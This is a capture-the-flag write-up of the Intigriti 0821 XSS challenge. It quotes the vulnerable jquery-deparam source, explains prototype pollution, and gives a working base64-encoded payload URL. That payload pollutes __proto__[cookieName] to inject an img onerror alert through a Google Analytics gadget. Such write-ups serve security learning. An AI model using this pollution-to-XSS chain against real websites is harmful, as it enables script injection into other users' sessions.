## Intigriti-0821 — XSS Challenge 
![1](https://user-images.githubusercontent.com/59454895/130160182-3de0c889-21db-421d-8444-e412e76a744b.PNG)

## Lets Start

The challenge website had three fields, " The basic XSS ", "The SVG" and " The Polyglot".
Every field had inside the url some parameters composed in this way:
 
```https://challenge-0821.intigriti.io/challenge/cooking.html?recipe=title=The basic XSS&ingredients[]=A script tag&ingredients[]=Some javascript&payload=<script>alert(1)</script>&steps[]=Find target&steps[]=Inject&steps[]=Enjoy```
, everything was encoded in Base64.

First of all i started to look inside the code and i managed to find two interesting function inside the file main.js:
![1](https://user-images.githubusercontent.com/59454895/130160632-9f46a627-5b5c-49a0-bea1-6daf5550de0d.PNG)
This function helped me to understand where the injection point was.
![2](https://user-images.githubusercontent.com/59454895/130160638-6edd3f27-5402-403a-9bd7-aa8ec13ecc87.PNG)

This other function helped me to understand that the name was generated from the cookie, in fact i tried to manipulate the name inside the cookie field from the console by putting a XSS payload and it worked, but it's not valid for the challenge since it's a self xss.

In order to understand how to manipulate the username field from the cookie i started to look inside others javascript files, and i found an interesting javascript file called " jquery-deparam.js " with the following code:
```html
(function(deparam){
    if (typeof require === 'function' && typeof exports === 'object' && typeof module === 'object') {
        try {
            var jquery = require('jquery');
        } catch (e) {
        }
        module.exports = deparam(jquery);
    } else if (typeof define === 'function' && define.amd){
        define(['jquery'], function(jquery){
            return deparam(jquery);
        });
    } else {
        var global;
        try {
          global = (false || eval)('this'); // best cross-browser way to determine global for < ES5
        } catch (e) {
          global = window; // fails only if browser (https://developer.mozilla.org/en-US/docs/Web/Security/CSP/CSP_policy_directives)
        }
        global.deparam = deparam(global.jQuery); // assume jQuery is in global namespace
    }
})(function ($) {
    var deparam = function( params, coerce ) {
        var obj = {},
        coerce_types = { 'true': !0, 'false': !1, 'null': null };

        // If params is an empty string or otherwise falsy, return obj.
        if (!params) {
            return obj;
        }

        // Iterate over all name=value pairs.
        params.replace(/\+/g, ' ').split('&').forEach(function(v){
            var param = v.split( '=' ),
            key = decodeURIComponent( param[0] ),
            val,
            cur = obj,
            i = 0,

            // If key is more complex than 'foo', like 'a[]' or 'a[b][c]', split it
            // into its component parts.
            keys = key.split( '][' ),
            keys_last = keys.length - 1;

            // If the first keys part contains [ and the last ends with ], then []
            // are correctly balanced.
            if ( /\[/.test( keys[0] ) && /\]$/.test( keys[ keys_last ] ) ) {
                // Remove the trailing ] from the last keys part.
                keys[ keys_last ] = keys[ keys_last ].replace( /\]$/, '' );

                // Split first keys part into two parts on the [ and add them back onto
                // the beginning of the keys array.
                keys = keys.shift().split('[').concat( keys );

                keys_last = keys.length - 1;
            } else {
                // Basic 'foo' style key.
                keys_last = 0;
            }

            // Are we dealing with a name=value pair, or just a name?
            if ( param.length === 2 ) {
                val = decodeURIComponent( param[1] );

                // Coerce values.
                if ( coerce ) {
                    val = val && !isNaN(val) && ((+val + '') === val) ? +val        // number
                    : val === 'undefined'                       ? undefined         // undefined
                    : coerce_types[val] !== undefined           ? coerce_types[val] // true, false, null
                    : val;                                                          // string
                }

                if ( keys_last ) {
                    // Complex key, build deep object structure based on a few rules:
                    // * The 'cur' pointer starts at the object top-level.
                    // * [] = array push (n is set to array length), [n] = array if n is
                    //   numeric, otherwise object.
                    // * If at the last keys part, set the value.
                    // * For each keys part, if the current level is undefined create an
                    //   object or array based on the type of the next keys part.
                    // * Move the 'cur' pointer to the next level.
                    // * Rinse & repeat.
                    for ( ; i <= keys_last; i++ ) {
                        key = keys[i] === '' ? cur.length : keys[i];
                        cur = cur[key] = i < keys_last
                        ? cur[key] || ( keys[i+1] && isNaN( keys[i+1] ) ? {} : [] )
                        : val;
                    }

                } else {
                    // Simple key, even simpler rules, since only scalars and shallow
                    // arrays are allowed.

                    if ( Object.prototype.toString.call( obj[key] ) === '[object Array]' ) {
                        // val is already an array, so push on the next value.
                        obj[key].push( val );

                    } else if ( {}.hasOwnProperty.call(obj, key) ) {
                        // val isn't an array, but since a second value has been specified,
                        // convert val into an array.
                        obj[key] = [ obj[key], val ];

                    } else {
                        // val is a scalar.
                        obj[key] = val;
                    }
                }

            } else if ( key ) {
                // No value was defined, so set something meaningful.
                obj[key] = coerce
                ? undefined
                : '';
            }
        });

        return obj;
    };
    if ($) {
      $.prototype.deparam = $.deparam = deparam;
    }
    return deparam;
});
```

I just searched  on google about this library and I found out it's old and vulnerable to prototype pollution ,in fact  a malicious user was allowed to inject properties into Object.prototype with something simple like  ```?__proto__[test]=test```.
Now everything started to make sense because i understood i could manipulate the cookie's username field thanks to the prototype pollution


## What is Prototype Pollution ?

In javascript every Object can be viewed as a key-value pair, with the key being a string, and the value can be anything (similar to “map” or “dictionary” in other languages). Everything that you type in JavaScript (except from primitives) is an Object.

Prototype is an attribute related to Object, it is used as a mechanism that enables JavaScript Objects to inherit features from one to another. Since almost everything in JavaScript is an Object, Prototype is an Object too.
An  Objects Prototype may also have a Prototype, and from it, it can inherit his Prototype or other attributes, and so on. This is referred to as a prototype chain.

Prototype Pollution occurs when an attacker manipulates ``` __proto__ ```, usually by adding a new Prototype into ```__proto__ ```. Since ```__proto__```  exists for every Object, and every Objects inherits the Prototypes from their Prototype, this addition is inherited by all the JavaScript Objects through the prototype chain. Malicious players could take advantage of the ability to insert properties into existing JavaScript code, and execute either Denial of Service attacks, by triggering JavaScript exceptions, or Remote Code Execution, by injecting malicious code. 

To better understand how this vulnerability works, I suggest you read these two articles:
https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/

https://portswigger.net/daily-swig/prototype-pollution-the-dangerous-and-underrated-vulnerability-impacting-javascript-applications



## Final Payload

To finish my payload I needed to understand if I could use some gadgets and execute a XSS, while I was looking on google I found this research https://github.com/BlackFan/client-side-prototype-pollution, it was very useful to me because there was a good gagdet example with Google Analytics:

![1](https://user-images.githubusercontent.com/59454895/130161577-95553b61-4846-4b78-a45d-755b40ec3cce.PNG)

Inside the challenge Google Analytics was used, we can see it in the following two screens:

![1](https://user-images.githubusercontent.com/59454895/130162688-c3c68802-1c94-4715-8cb2-a78f7b7f702b.PNG)

![1](https://user-images.githubusercontent.com/59454895/130165680-2c1f9d73-edcc-4c2d-8227-9941a947083c.PNG)



My final payload was:
https://challenge-0821.intigriti.io/challenge/cooking.html?recipe=dGl0bGU9VGhlJTIwYmFzaWMlMjBYU1MmaW5ncmVkaWVudHMlNUIlNUQ9QSUyMHNjcmlwdCUyMHRhZyZpbmdyZWRpZW50cyU1QiU1RD1Tb21lJTIwamF2YXNjcmlwdCZwYXlsb2FkPSUzQ3NjcmlwdCUzRWFsZXJ0KDEpJTNDL3NjcmlwdCUzRSZzdGVwcyU1QiU1RD1GaW5kJTIwdGFyZ2V0JnN0ZXBzJTVCJTVEPUluamVjdCZzdGVwcyU1QiU1RD1FbmpveSZfX3Byb3RvX19bY29va2llTmFtZV09dXNlcm5hbWUlM0Q8aW1nJTIwc3JjJTNEeCUyMG9uZXJyb3IlM0RhbGVydChkb2N1bWVudC5kb21haW4pPiUzQiZfX3Byb3RvX19bY29va2llTmFtZV09dXNlcm5hbWUlM0Q8aW1nJTIwc3JjJTNEeCUyMG9uZXJyb3IlM0RhbGVydChkb2N1bWVudC5kb21haW4pPiUzQiZfX3Byb3RvX19bY29va2llTmFtZV09dXNlcm5hbWUlM0Q8aW1nJTIwc3JjJTNEeCUyMG9uZXJyb3IlM0RhbGVydChkb2N1bWVudC5kb21haW4pPiUzQg==

I just added ```?__proto__[cookieName]=username%3D<img%20src%3Dx%20onerror%3Dalert(document.domain)>%3B``` as GET parameter inside the challenge's url and encoded it in base64,
in this way I polluted the cookieName and injected my XSS payload in the username field inside the cookie. The alert appeared.

![1](https://user-images.githubusercontent.com/59454895/130163257-8278d8a9-5509-441a-b064-b2e9fd2bda64.PNG)





























